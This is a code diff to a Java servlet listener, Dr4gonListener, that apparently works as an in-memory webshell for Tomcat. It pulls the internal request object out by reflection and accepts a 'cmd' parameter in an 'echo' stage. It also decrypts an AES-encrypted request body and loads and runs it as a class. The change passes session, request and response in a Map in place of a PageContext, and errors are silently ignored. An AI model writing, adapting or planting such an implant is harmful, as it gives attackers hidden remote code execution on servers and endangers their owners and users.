@@ -9,11 +9,12 @@ import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.*;
 import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.lang.reflect.Field;
 import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
 
 
 public class Dr4gonListener implements ServletRequestListener {
@@ -33,7 +34,11 @@ public class Dr4gonListener implements ServletRequestListener {
             Request request = (Request) field.get(requestfacade);
             Response response = request.getResponse();
             HttpSession session = request.getSession();
-            PageContext pageContext = new ccdr4gon.utils.Dr4gonPageContext(request, response, session);
+            Map<String,Object> objMap = new HashMap<>();
+            objMap.put("session",session);
+            objMap.put("request",request);
+            objMap.put("response",response);
+
             //回显
             if (request.getParameter("stage").equals("echo")) {
                 String cmd=request.getParameter("cmd");
@@ -63,7 +68,7 @@ public class Dr4gonListener implements ServletRequestListener {
                 session.putValue("u", k);
                 Cipher c = Cipher.getInstance("AES");
                 c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
-                new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);
+                new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(objMap);
             }
         } catch (Exception ignored) {
         }
